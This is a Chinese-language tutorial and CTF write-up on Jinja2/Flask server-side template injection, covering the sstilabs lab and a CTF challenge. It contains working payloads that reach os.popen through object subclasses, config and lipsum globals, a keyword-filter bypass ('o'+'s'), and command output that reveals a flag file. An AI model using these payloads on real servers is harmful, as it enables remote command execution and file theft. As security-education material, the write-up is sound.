# ssti(Server-Side Template Injection)
----服务器端 **模版** 注入

## 首先理解一下什么是模版
使用jinja的web开发中,模版一般是一个.jinja文件:
```html
<h1>你好，{{ username }}</h1>

{% if user.is_admin %}
  <a href="/admin">管理后台</a>
{% endif %}
```
里面大部分内容是html,`{% if %}`、`{{ }}` 是模板引擎语法,最终模版引擎在服务器端将里面的内容渲染成html后再发给浏览器

这里的模版设计时就是用来**展示数据**的,但是如果用户的输入能进入模版的原码,就不只是展示这么简单了

## ssti的本质
本质是后端将将用户输入当成了**模板源码**来执行,而不是作为数据填充
焗一个栗子:
```python
# 安全的写法
from jinja2 import Template

tpl = Template("Hello, {{ name }}!")   # 模板源码是开发者写死的
output = tpl.render(name=user_input)  # 用户输入通过name变量来传入已经编译好的模版,不会被执行


#危险写法
from jinja2 import Template

user_input = "{{7*7}}"
template_source = "Hello, " + user_input + "!"  # 将用户的输入作为模版源码的一部分,会被编译执行
tpl = Template(template_source)   # 编译：字符串 → 模板对象
output = tpl.render()             # 渲染：执行模板，输出 "Hello, 49!"
``` 
在jinja2引擎里面,{{ }}是表达式界定符,它让模版将里面的内容视为表达式,然后翻译成python,编译并执行
支持：
- 字面量：`{{ 7 }}`、`{{ "abc" }}`
- 运算：`{{ 7*7 }}`、`{{ a + b }}`
- ==🔴属性访问：`{{ user.name }}`==
- 下标：`{{ items[0] }}`
- ==🔴函数/方法调用：`{{ range(3) }}`、`{{ obj.method() }}`==
- 过滤器：`{{ name|upper }}`
后面的攻击就是利用这两点,从一个普通对象,到eval等危险函数,然后调用他们

# ssti注入流程
## 1.识别漏洞
一般存在于与用户输入有关的地方

## 2.确定引擎类型 

![[Pasted image 20261025013505.png]]

## 3.信息收集
探索环境信息和是否有过滤
在jinja2中可以如下payload
```python
{{().__class__.__base__}} # 获得基类object

{{config}} # 获得falsk配置信息
```
我们来看看第二条是怎么运作的:
flask是一个web框架,flask调用jinja2来解析{{}},查变量,求值,访问对象和方法等操作,flask则负责web的基本操作:**路由routing / 请求响应request&response / 会话session / 配置config**
其中的config就是我们要利用的关键啦

falsk在开始app.flask实例化时,会创建config对象实例,他的__init__方法(也就是构造方法)接受flask的默认值并初始化,储存一些配置信息
然后在创建jinja环境时,flask还会把自己的config对象,注入jinja的全局变量里面
然后用{{}}就可以查询变量config的信息啦


# 来试试一个easy的实战
靶场是:[X3NNY/sstilabs: A lab to help you learning SSTI](https://github.com/X3NNY/sstilabs)
直接下载zip文件后在flasklab目录下运行 `python app.py`即可

一般的python流程:找对象 A 的类 - 类 A -> 找类 A 的父亲 - 类 B -> 找祖先 / **基类** - 类 O -> 遍历祖先下面所有的子类 -> 找到可利用的类 类 F 类 G-> 构造利用方法-> 读写文件 / 执行命令
补:用.\__mro\__[-1]可以直接拿到object,对多重继承的类不用一直找父类
## leval1

首先找基类
```python
{{ ''.__class__.__base__ }}
```
意思是从一个随便的对象出发,
class返回他的类
base返回他的基类也就是<class 'object'>

然后就能通过object找到所有的类
```python
{{ ''.__class__.__base__.__subclasses__() }}
```
执行subclasses()函数返回所有的子类
在其中找可以执行命令或文件读取的类:![[Pasted image 20261025170315.png]]
有很多的类可以选取
这里我们选取os.\_wrap_close类
为啥呢:
我们这样利用
```python
os._wrap_close.__init__.__globals__
```
好像还是看不懂,别急
我们想要的是全局命名空间globals里面的, 可以操控文件或者命令执行的函数
注意,globals取的是: 一个**函数**,它的定义所在的**模块**,的全局命名空间
init取表示一个类的构造方法函数
而这个函数在os.\_wrap_close里定义,os.\_wrap_close这个又是在os模块内定义的

综上,这个payload, 指向的就是 `os` 模块的全局命名空间字典 , 其中就包括用于执行系统命令的 `popen` 和 `system`


okok了解了原理以后看看具体操作
```python
{{''.__class__.__base__.__subclasses__()}}
```
这个返回的是所有类,怎么找到想要呢
可以用浏览器自带的查找: 先查找os找到大概位置,然后查class或者逗号在找到下标就好
```python
{{''.__class__.__base__.__subclasses__()[165].__init__.__globals__}}
```
再次通过查找看看有没有我们想要的popen函数
找到了
```python
 'popen': <function popen at 0x0000023F5B892840>,
```
globals是字典,储存的是键值对,键名叫'popen',值是函数popen
所以通过\[键值]来得到函数
通过()来传入参数:你要执行的命令(注意区分win和linux)
再通过.read()返回命令结果
得到以下最终payload
```python
{{''.__class__.__base__.__subclasses__()[165].__init__.__globals__['popen']('dir').read()}}

# 再打开想要的文件
{{''.__class__.__base__.__subclasses__()[165].__init__.__globals__['popen']('cat falg').read()}}
```

# 琪露诺的完美算数教室!
进入网页是一个对话框,输入什么就会原样返回
对我现在的知识水平,尝试了sql注入和抓包后都没有什么效果

尝试ssti payload:
```python
{{7*7}}
```
返回49,那是ssti石锤了

尝试获取flask配置信息
```python
{{config}}
```
成功返回配置
```python
我知道了! 答案是 <Config {'DEBUG': True, 'TESTING': False, 'PROPAGATE_EXCEPTIONS': None, 'SECRET_KEY': None, 'SECRET_KEY_FALLBACKS': None, 'PERMANENT_SESSION_LIFETIME': datetime.timedelta(days=31), 'USE_X_SENDFILE': False, 'TRUSTED_HOSTS': None, 'SERVER_NAME': None, 'APPLICATION_ROOT': '/', 'SESSION_COOKIE_NAME': 'session', 'SESSION_COOKIE_DOMAIN': None, 'SESSION_COOKIE_PATH': None, 'SESSION_COOKIE_HTTPONLY': True, 'SESSION_COOKIE_SECURE': False, 'SESSION_COOKIE_PARTITIONED': False, 'SESSION_COOKIE_SAMESITE': None, 'SESSION_REFRESH_EACH_REQUEST': True, 'MAX_CONTENT_LENGTH': None, 'MAX_FORM_MEMORY_SIZE': 500000, 'MAX_FORM_PARTS': 1000, 'SEND_FILE_MAX_AGE_DEFAULT': None, 'TRAP_BAD_REQUEST_ERRORS': None, 'TRAP_HTTP_EXCEPTIONS': False, 'EXPLAIN_TEMPLATE_LOADING': False, 'PREFERRED_URL_SCHEME': 'http', 'TEMPLATES_AUTO_RELOAD': None, 'MAX_COOKIE_SIZE': 4093, 'PROVIDE_AUTOMATIC_OPTIONS': True}> !哼哼, 不愧是我~
```

尝试最一般的路线,通过一个普通实例到object再到globals
```python
{{''.__class__.__bases__}}
```
返回了object类,目前是可以的,继续:
```python
{{''.__class__.__bases__.__subclasses()__}}
```
这里就有问题了
返回了一个特殊语句: 竟敢小看最强的我, 我要把你冻起来!
那好像是触发了违禁词,只能尝试换一条路了

这里我有两种方法: 1.从config对象出发   2.从lipsum函数出发
## 1.config对象
首先,为什么是config?
因为他是flask的对象,定义在flask/config.py里面,而flask文件import 了 os!!!
既然是一个对象,想要找到系统函数,还是那条路,:
config对象 -- config类 --  init -- globals -- \['os'] -- popen
```python
{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}
```
发现又触发了waf,那一层层的来,看看是哪个词触发了
最后发现是os
那真好哇,**因为os是写在''里面的字符串,而字符串是可以拼接的**
改写payload
```python
{{config.__class__.__init__.__globals__['o'+'s'].popen('ls').read()}}
```
好了,成功返回(⁎˃ᴗ˂⁎),已经解决大半了
```
我知道了! 答案是 Dockerfile app.py static templates !哼哼, 不愧是我~
```
那直接执行linux命令就行
这里先看看根目录
```shell
ls -la /
```
这里的-l是详细查看,-a是显示隐藏文件(以.开头)
```
我知道了! 答案是 total 60 drwxr-xr-x 1 root root 4096 Aug 18 2025 app lrwxrwxrwx 1 root root 7 May 12 2025 bin -> usr/bin drwxr-xr-x 2 root root 4096 May 12 2025 boot drwxr-xr-x 5 root root 360 Oct 25 13:47 dev drwxr-xr-x 1 root root 4096 Oct 25 13:47 etc -rwxrwxrwx 1 root root 32 Jul 21 2025 fL1G_9 drwxr-xr-x 2 root root 4096 May 12 2025 home lrwxrwxrwx 1 root root 7 May 12 2025 lib -> usr/lib lrwxrwxrwx 1 root root 9 May 12 2025 lib64 -> usr/lib64 drwxr-xr-x 2 root root 4096 Aug 11 2025 media drwxr-xr-x 2 root root 4096 Aug 11 2025 mnt drwxr-xr-x 2 root root 4096 Aug 11 2025 opt dr-xr-xr-x 252 root root 0 Oct 25 13:47 proc drwx------ 1 root root 4096 Aug 18 2025 root drwxr-xr-x 1 root root 4096 Oct 25 13:47 run lrwxrwxrwx 1 root root 8 May 12 2025 sbin -> usr/sbin drwxr-xr-x 2 root root 4096 Aug 11 2025 srv dr-xr-xr-x 13 root root 0 Oct 24 05:52 sys drwxrwxrwt 1 root root 4096 Aug 18 2025 tmp drwxr-xr-x 1 root root 4096 Aug 11 2025 usr drwxr-xr-x 1 root root 4096 Aug 11 2025 var !哼哼, 不愧是我~
```
注意到有一个fL1G_9文件(注意力惊人,其实不用-l显示的话就很清楚了)
```shell
cat /fL1G_9
```
记得文件前面要带/嗷,因为是在根目录下的
得到flag:VIDAR{Y0u_aR3_a_ReA1_G3n1Us_!!!}

## 2. 再来看看lipsum函数吧
limpsum是jinja2的内置全局函数,可以在任何模板里面使用,所以你都可以直接{{limpsum}}
那为什么lipsum也能用呢?
跟config差不多,lipsum定义在 jinja2.utils里面,而这个文件的开头也ipmort了os!!

但lipsum的区别是,它自己就是个函数了,可以跳过init那些步骤,更方便了
```python
{{lipsum.__globals__['o'+'s'].popen('ls').read()}}
```
接下来同理嗷

// TODO
最后贴一个教程,感觉比较全:[ssti入门(原理介绍与常见绕过) - 落山机糊人 - 博客园](https://www.cnblogs.com/lx207/articles/18958248)